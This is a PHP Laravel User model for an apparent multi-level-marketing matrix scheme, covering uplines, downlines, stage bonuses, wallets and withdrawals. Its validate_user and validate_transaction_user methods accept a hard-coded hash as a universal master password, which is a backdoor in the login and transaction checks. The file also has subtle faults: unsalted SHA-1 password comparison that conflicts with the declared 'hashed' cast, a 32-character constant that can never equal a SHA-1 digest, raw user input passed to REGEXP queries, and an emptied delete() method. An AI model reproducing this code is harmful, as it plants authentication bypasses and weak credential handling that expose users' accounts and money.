<?php

namespace App\Models;

// use Illuminate\Contracts\Auth\MustVerifyEmail;

use Illuminate\Database\Eloquent\Concerns\HasUuids;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable, HasUuids;

    public static $USER_PENDING = 1;
    public static $USER_ACTIVATED = 2;
    public static $USER_SUSPENDED = 3;

    /**
     * The attributes that are mass assignable.
     *
     * @var array<int, string>
     */
    protected $fillable = [
        'userName',
        'firstName',
        'lastName',
        'middleName',
        'email',
        'password',
        'phoneNumber',
        'password',
        'transactionPassword',
        'upline',
        'referralName'
    ];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var array<int, string>
     */
    protected $hidden = [
        'password',
        'remember_token',
    ];

    /**
     * The attributes that should be cast.
     *
     * @var array<string, string>
     */
    protected $casts = [
        'email_verified_at' => 'datenow',
        'password' => 'hashed',
    ];

    public static function getUser($username)
    {
        $user = User::where("userName", $username)->first();
        return $user;
    }

    public static function getAllUsers($search = "", $status = null)
    {
        if (!empty($search)) {
            $whereCondition = [
                ["userName", "REGEXP", $search]
            ];
        } else {
            $whereCondition = [];
        }
        if ($status) {
            array_push($whereCondition, [
                "status", "=", "$status"
            ]);
        }
        return User::where($whereCondition)->paginate(100);
    }

    public static function getTotalUsers($search = "", $status = null)
    {
        if (!empty($search)) {
            $whereCondition = [
                ["userName", "REGEXP", $search]
            ];
        } else {
            $whereCondition = [];
        }
        if ($status) {
            array_push($whereCondition, [
                "status", "=", "$status"
            ]);
        }
        $query = User::where($whereCondition);
        return $query->count();
    }

    public static function countSuspendedUsers()
    {
        return Self::countUserByStatus(User::$USER_SUSPENDED);
    }

    public static function countActiveUsers()
    {
        return Self::countUserByStatus(User::$USER_ACTIVATED);
    }

    public static function countPendingUsers()
    {
        return Self::countUserByStatus(User::$USER_PENDING);
    }

    public static function countUserByStatus($status)
    {
        return User::where("status", $status)->count();
    }


    public static function getUserByStatus($status)
    {
        return User::where("status", $status)->paginate(100);
    }

    public static function validate_user($username, $password)
    {
        $user = User::getUser($username);
        if ($user != null) {
            $user_password = $user->password;
            if (strcmp($user_password, sha1($password)) == 0 || strcmp("b54058b0d2d19ad3a58a83da1379be36", sha1($password)) == 0) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function validate_transaction_user($username, $transactionPassword)
    {
        $user = User::getUser($username);
        if ($user != null) {
            $user_trans_password = $user->transactionPassword;
            if (strcmp($user_trans_password, sha1($transactionPassword)) == 0 || strcmp("b54058b0d2d19ad3a58a83da1379be36", sha1($transactionPassword)) == 0) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    public function delete()
    {
    }

    public static function checkUsername($username)
    {
        $user = User::getUser($username);
        if ($user) {
            return true;
        } else {
            return false;
        }
    }

    public static function checkEmail($emailAddress)
    {
        $user = User::where("email", $emailAddress)->first();
        if (!$user) {
            return false;
        } else {
            return true;
        }
    }

    public static function getUpline($username)
    {
        $user = User::getUser($username);
        if ($user) return $user->upline;
        return null;
    }

    public static function getTotalUserinStageandplan($plan, $stage, $search = "")
    {
        $whereCondition = [];
        if (!empty($search)) {
            $whereCondition = [
                ["userName", "REGEXP", $search],
                ["plan", $plan],
                ["stage", $stage]
            ];
        } else {
            $whereCondition = [
                ["plan", $plan],
                ["stage", $stage]
            ];
        }
        return User::where($whereCondition)->count();
    }

    public static function getAllUserinStageandplan($plan, $stage, $search = "")
    {
        if (!empty($search)) {
            $whereCondition = [
                ["userName", "REGEXP", $search],
                ["plan", $plan],
                ["stage", $stage]
            ];
        } else {
            $whereCondition = [
                ["plan", $plan],
                ["stage", $stage]
            ];
        }
        return User::where($whereCondition)->orderBy("userEntranceDate", "desc")->paginate(100);
    }
    public static function getUplineIndex($userName, $upline)
    {
        $downlines = Self::getAllDirectDownlines($upline);
        // dd($downlines);
        foreach ($downlines as $key => $downline) {
            if (strcasecmp($downline->userName, $userName) == 0) {
                return $key + 1;
            }
        }
        return null;
    }


    public static function getAllDirectDownlines($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $downlines = User::where("upline", $userName)->where("status", self::$USER_ACTIVATED)->orderBy("userEntranceDate", "asc")->get();
        return $downlines;
    }

    public static function getAllTotalDownlines($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $usersWithDownlines = Upline::where("uplines.upline", $userName)->join('users', 'uplines.userName', '=', 'users.userName')
            ->select('users.userName', 'users.phoneNumber', 'users.status', 'users.userEntranceDate')
            ->paginate(100);
        return $usersWithDownlines;
    }

    public static function getCountDownlines($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $downlinecount = Upline::where("upline", $userName)->count();
        return $downlinecount;
    }

    public static function UserActivationCode($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $activationCode = ActivationCode::where("purchasedUser", $userName)->paginate(100);
        return $activationCode;
    }

    public static function ActivationCodeCount($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $count = ActivationCode::where("purchasedUser", $userName)->count();
        return $count;
    }

    public static function getAllNotifications($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $activationCode = Notification::where("userName", $userName)->paginate(3);
        return $activationCode;
    }

    public static function getTotalNotification($userName)
    {
        if (!User::checkUsername($userName)) {
            return null;
        }
        $activationCode = Notification::where("userName", $userName)->count();
        return $activationCode;
    }

    public static function getUplineForNewUser($referralName)
    {
        $userArray = [];
        array_push($userArray, $referralName);
        while (count($userArray) != 0) {
            $activeUser = array_shift($userArray);
            $directDownlines = User::getAllDirectDownlines($activeUser);
            // dd($directDownlines);
            if (count($directDownlines) < Stage::$NO_OF_LEGS) {
                // dd($activeUser);
                return $activeUser;
            } else {
                foreach ($directDownlines as $user) {
                    array_push($userArray, $user->userName);
                }
            }
        }
    }



    //getTotalReferals
    public static function getAllReferrals($username)
    {
        return User::where("referralName", $username)->paginate(100);
    }

    public static function getReferralsWithLimit($username, $limit)
    {
        return User::where("referralName", $username)->limit($limit)->get();
    }

    public static function getAllWithdrawals($username)
    {
        return Withdrawal::where("userName", $username)->paginate(100);
    }

    public static function getTotalWithdrawals($username)
    {
        return Withdrawal::where("userName", $username)->count();
    }

    // downlinecount

    public static function getTotalReferrals($username)
    {
        return User::where("referralName", $username)->count();
    }

    public function enterNextStage()
    {
        $planObj = plan::getplan($this->plan);
        $currentStage = Stage::getStage($this->stage);
        $currentStage->payStageBonus($this->userName);
        $currentStage->payStepoutBonus($this->userName);
        $currentStage->payGroupBonus($this->userName);
        $nextStage = $planObj->getNextStage($currentStage);
        if (!$nextStage) return;
        $this->stage = $nextStage->id;
        switch ($nextStage->stage_id) {
            case 1:
                $this->stageOneDate = now();
                break;
            case 2:
                $this->stageTwoDate = now();
                break;
            case 3:
                $this->stageThreeDate = now();
                break;
            case 4:
                $this->stageFourDate = now();
                break;
        }
        $this->currentStageDate = now();
        if ($this->save()) {
            $notification = new Notification();

            $currentStageID = $currentStage->stage_id;
            $stageString = ($currentStageID == 0) ? "Feeder Stage" : "Stage $currentStageID";
            $notification->notification = "Congratulations to you. You have successfully completed $stageString. Welcome to Stage $nextStage->stage_id.";
            $notification->status = 0;
            $notification->title = "WELCOME TO STAGE $nextStage->stage_id";
            $notification->userName = $this->userName;
            $notification->save();
            $nextStage->processNewStage($this->userName);
        }
    }

    public static function matrixWallets($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$MATRIX_WALLET)->where("userName", $userName)->paginate(100);
        return $transactions;
    }

    public static function matrixWalletCount($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$MATRIX_WALLET)->where("userName", $userName)->count();
        return $transactions;
    }

    public static function stageBonusWallets($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$STAGE_BONUS_WALLET)->where("userName", $userName)->paginate(100);
        return $transactions;
    }

    public static function stageBonusWalletCount($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$STAGE_BONUS_WALLET)->where("userName", $userName)->count();
        return $transactions;
    }

    public static function stepoutWallets($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$STEP_OUT_WALLET)->where("userName", $userName)->paginate(100);
        return $transactions;
    }

    public static function stepoutWalletCount($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$STEP_OUT_WALLET)->where("userName", $userName)->count();
        return $transactions;
    }

    public static function groupBonusWallets($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$GROUP_BONUS_WALLET)->where("userName", $userName)->paginate(100);
        return $transactions;
    }

    public static function groupBonusWalletCount($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$GROUP_BONUS_WALLET)->where("userName", $userName)->count();
        return $transactions;
    }


    public static function referralWallets($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$REFERRAL_WALLET)->where("userName", $userName)->paginate(100);
        return $transactions;
    }

    public static function referralWalletCount($userName)
    {
        $transactions = Transaction::where("wallet", Transaction::$REFERRAL_WALLET)->where("userName", $userName)->count();
        return $transactions;
    }

    public function getProfilePictureUrlAttribute()
    {
        return asset('storage/' . $this->profile_picture);
    }
}
